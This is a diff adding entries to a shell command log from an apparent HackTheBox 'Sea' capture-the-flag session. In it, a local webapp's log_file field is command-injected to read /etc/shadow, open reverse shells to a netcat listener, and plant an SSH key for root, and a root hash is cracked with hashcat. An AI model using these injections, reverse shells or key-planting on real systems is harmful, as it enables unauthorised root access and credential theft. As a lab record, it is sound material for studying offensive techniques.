@@ -107,3 +107,89 @@
 [2026-02-14 19:24:48] [pane=%4] [CMD] : #note asay reused password mychemicalromance from the sea.htb/loginURL as he did for ssh. we logged in with it and pulled flag 75a3cdc7ed3944f0504b26f0843e132b
 [2026-02-14 19:29:16] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
 [2026-02-14 19:34:37] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
+[2026-02-18 05:11:41] [pane=%3] [CMD] ssh amay@10.129.6.48
+[2026-02-18 05:12:13] [pane=%3] [CMD] echo export IP=10.129.1.5 > ~/.ip
+[2026-02-18 05:12:18] [pane=%3] [CMD] source ~/.ip
+[2026-02-18 05:12:29] [pane=%3] [CMD] sudo vim /etc/hosts
+[2026-02-18 05:12:53] [pane=%3] [CMD] ssh amay@10.129.6.48
+[2026-02-18 05:12:59] [pane=%3] [CMD] ssh amay@10.129.1.5
+[2026-02-18 05:15:37] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.1.5
+[2026-02-18 05:36:01] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.1.5
+[2026-02-18 05:40:39] [pane=%2] [CMD] curl localhost:9090
+[2026-02-18 05:57:01] [pane=%2] [CMD] locate pspy
+[2026-02-18 05:58:08] [pane=%2] [CMD] cd /usr/bin/pspy
+[2026-02-18 05:58:13] [pane=%2] [CMD] cd /usr/bin/
+[2026-02-18 05:58:15] [pane=%2] [CMD] ll
+[2026-02-18 05:58:27] [pane=%2] [CMD] ls pspy
+[2026-02-18 05:58:32] [pane=%2] [CMD] cd pspy
+[2026-02-18 05:58:42] [pane=%2] [CMD] ls -Aslp pspy
+[2026-02-18 05:59:11] [pane=%2] [CMD] cd ../share/pspy
+[2026-02-18 05:59:13] [pane=%2] [CMD] ll
+[2026-02-18 05:59:33] [pane=%2] [CMD] python3 -m http.server 6969
+[2026-02-18 06:16:09] [pane=%2] [CMD] ll
+[2026-02-18 06:16:14] [pane=%2] [CMD] cd ~/Downloads
+[2026-02-18 06:16:15] [pane=%2] [CMD] ll
+[2026-02-18 06:16:34] [pane=%2] [CMD] python3 -m http.server 6969
+[2026-02-18 06:20:28] [pane=%1] [CMD] : #note analyze log file button is 'analyzing' /var/log/apache2/access.log. tried to view that file with amay user and met with access denied which leads us to believe the local webapp and the button is running with a higher priv. 
+[2026-02-18 06:29:18] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=access.log&analyze=Analyze'
+[2026-02-18 06:47:34] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/etc/shadow&analyze_log='
+[2026-02-18 07:02:24] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/etc/shadow&analyze_log='
+[2026-02-18 07:02:55] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/root/root.txt&analyze_log='
+[2026-02-18 07:03:31] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=access.log&analyze=Analyze'
+[2026-02-18 07:03:41] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=access.log&analyze;id=Analyze'
+[2026-02-18 07:04:19] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/etc/shadow&analyze_log='
+[2026-02-18 07:22:37] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/root/root.txt&analyze_log='
+
+[2026-02-18 07:23:51] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/Sea
+[2026-02-18 07:23:55] [pane=%2] [CMD] ll
+[2026-02-18 07:24:04] [pane=%2] [CMD] cd loot
+[2026-02-18 07:24:05] [pane=%2] [CMD] ll
+[2026-02-18 07:25:19] [pane=%2] [CMD] echo 'root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0:19775:0:99999:7:::' > root.hash
+[2026-02-18 07:25:21] [pane=%2] [CMD] ll
+[2026-02-18 07:25:24] [pane=%2] [CMD] cat root.hash
+[2026-02-18 07:28:52] [pane=%2] [CMD] vim root.hash
+[2026-02-18 07:30:51] [pane=%2] [CMD] hashcat root.hash /usr/share/wordlists/rockyou.txt
+[2026-02-18 07:37:08] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/root/root.txt:id&analyze_log='
+[2026-02-18 07:37:16] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' -d 'log_file=/root/root.txt;id&analyze_log='
+[2026-02-18 07:55:34] [pane=%0] [CMD] ~/TELOS
+[2026-02-18 07:55:35] [pane=%0] [CMD] ll
+[2026-02-18 07:55:39] [pane=%0] [CMD] cat WISDOM.md
+[2026-02-18 11:49:54] [pane=%3] [CMD] rlwrap nc -lnvp 42070
+[2026-02-18 11:53:37] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c "bash -i >& /dev/tcp/10.10.14.69/42070 0>&1"' -d 'analyze_log='
+[2026-02-18 11:54:32] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c "bash -i >& /dev/tcp/10.10.14.69/42070 0>&1"' -d 'analyze_log='
+[2026-02-18 11:55:43] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c "bash -i >& /dev/tcp/10.10.14.69/42070 0>&1"' -d 'analyze_log='
+[2026-02-18 11:56:37] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c "bash -i >& /dev/tcp/10.10.14.11/42070 0>&1"' -d 'analyze_log='
+[2026-02-18 11:58:24] [pane=%3] [CMD] rlwrap nc -lnvp 42070
+[2026-02-18 11:59:46] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c --norc-noprofile -i >& /dev/tcp/10.10.14.11/42070 0>&1' -d 'analyze_log='
+[2026-02-18 12:00:02] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash -c --norc-noprofile -i >& /dev/tcp/10.10.14.11/42070 0>&1' -d 'analyze_log='
+[2026-02-18 12:01:09] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash --norc-noprofile -i >& /dev/tcp/10.10.14.11/42070 0>&1' -d 'analyze_log='
+[2026-02-18 12:01:52] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;bash --norc --noprofile -i >& /dev/tcp/10.10.14.11/42070 0>&1' -d 'analyze_log='
+[2026-02-18 12:03:13] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;sh -i >& /dev/tcp/10.10.14.11/42070 0>&1' -d 'analyze_log='
+[2026-02-18 12:06:23] [pane=%2] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash --norc --noprofile -i 2>&1|nc 10.10.14.11 42070 >/tmp/f' -d 'analyze_log='
+[2026-02-19 08:39:00] [pane=%3] [CMD] cat ~/.ssh/id_ed25519
+[2026-02-19 08:39:13] [pane=%3] [CMD] ls ~/.ssh/id_ed25519
+[2026-02-19 08:41:21] [pane=%3] [CMD] cd ~/.ssh
+[2026-02-19 08:41:42] [pane=%3] [CMD] ssh-keygen -y -f id_ed25519
+[2026-02-19 08:41:54] [pane=%3] [CMD] ll
+[2026-02-19 08:42:02] [pane=%3] [CMD] cat id_ed25519.pub
+[2026-02-19 08:45:49] [pane=%4] [CMD] echo export IP=10.129.2.190 > ~/.ip
+[2026-02-19 08:45:58] [pane=%4] [CMD] sudo vim /etc/hosts
+[2026-02-19 08:48:12] [pane=%4] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;mkdir -p /root/.ssh;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqEjotALLK79N0TGk/b2vadhcpfMuZYDDzCELsOJJoD theo2612@github >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 08:48:53] [pane=%1] [CMD] : #note downloaded a statically compliled binary of pspy. no processes running with elevated perms
+[2026-02-19 09:42:47] [pane=%4] [CMD] ssh -i ~/.ssh/id_ed25519 root@10.129.1.5
+[2026-02-19 09:43:19] [pane=%3] [CMD] ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
+[2026-02-19 10:02:04] [pane=%3] [CMD] ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
+[2026-02-19 10:06:08] [pane=%3] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;mkdir -p /root/.ssh;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqEjotALLK79N0TGk/b2vadhcpfMuZYDDzCELsOJJoD theo2612@github >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 10:06:11] [pane=%3] [CMD] ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
+[2026-02-19 10:07:51] [pane=%3] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;cat /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 10:09:03] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.2.90
+[2026-02-19 10:09:16] [pane=%4] [CMD] ssh -L 9090:127.0.0.1:8080 amay@10.129.2.190
+[2026-02-19 10:09:31] [pane=%3] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;cat /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 10:09:37] [pane=%3] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;mkdir -p /root/.ssh;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqEjotALLK79N0TGk/b2vadhcpfMuZYDDzCELsOJJoD theo2612@github >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 10:09:47] [pane=%3] [CMD] curl -s http://127.0.0.1:9090/ -u 'amay:mychemicalromance' --data-urlencode 'log_file=/var/log/apache2/access.log;cat /root/.ssh/authorized_keys' -d 'analyze_log='
+[2026-02-19 10:09:56] [pane=%3] [CMD] ssh -i ~/.ssh/id_ed25519 root@10.129.2.190
+[2026-02-19 12:39:37] [pane=%3] [CMD] exit
+[2026-02-19 12:39:41] [pane=%4] [CMD] exit
+[2026-02-19 12:39:43] [pane=%2] [CMD] exit
+[2026-02-19 12:39:44] [pane=%0] [CMD] exit
+[2026-02-19 12:39:51] [pane=%1] [CMD] tmux kill-session
